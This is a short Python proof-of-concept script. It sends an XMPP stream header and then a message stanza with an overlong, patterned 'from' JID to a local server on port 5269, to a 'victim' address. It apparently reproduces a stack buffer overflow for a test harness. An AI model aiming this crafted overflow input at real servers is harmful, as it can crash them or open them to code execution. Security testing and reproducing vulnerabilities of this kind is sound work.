#!/usr/bin/env python3
"""Send one XMPP stream header and one crafted <message/> to 127.0.0.1:5269.

No external destination. The JID is a deterministic pattern chosen by the
sender: from[i] = 'A' + i % 26. Default 299 bytes matches the pinned harness;
an optional length argument probes the live stack frame.
"""
import socket
import sys
import time

FROM_LEN = int(sys.argv[1]) if len(sys.argv) > 1 else 299
FROM = "".join(chr(ord("A") + i % 26) for i in range(FROM_LEN))
STREAM = (
    "<?xml version='1.0'?>"
    "<stream:stream xmlns:stream='http://etherx.jabber.org/streams' "
    "xmlns='jabber:server' version='1.0' to='127.0.0.1'>"
)
STANZA = (
    '<message from="%s" to="victim@sip.domain" type="chat">'
    "<body>hi</body></message>" % FROM
)


def main():
    s = socket.create_connection(("127.0.0.1", 5269), timeout=3)
    s.settimeout(1.0)
    print("WIRE stream=%r" % STREAM.encode())
    s.sendall(STREAM.encode())
    time.sleep(0.3)
    try:
        reply = s.recv(8192)
        print("WIRE reply1=%r" % reply)
    except socket.timeout:
        print("WIRE reply1=<timeout>")
    print("WIRE stanza_len=%d from_len=%d from[252:268]=%r"
          % (len(STANZA), len(FROM), FROM[252:268].encode()))
    s.sendall(STANZA.encode())
    time.sleep(1.0)
    try:
        reply = s.recv(8192)
        print("WIRE reply2=%r" % reply)
    except socket.timeout:
        print("WIRE reply2=<timeout>")
    s.close()
    print("WIRE client_done")


if __name__ == "__main__":
    main()
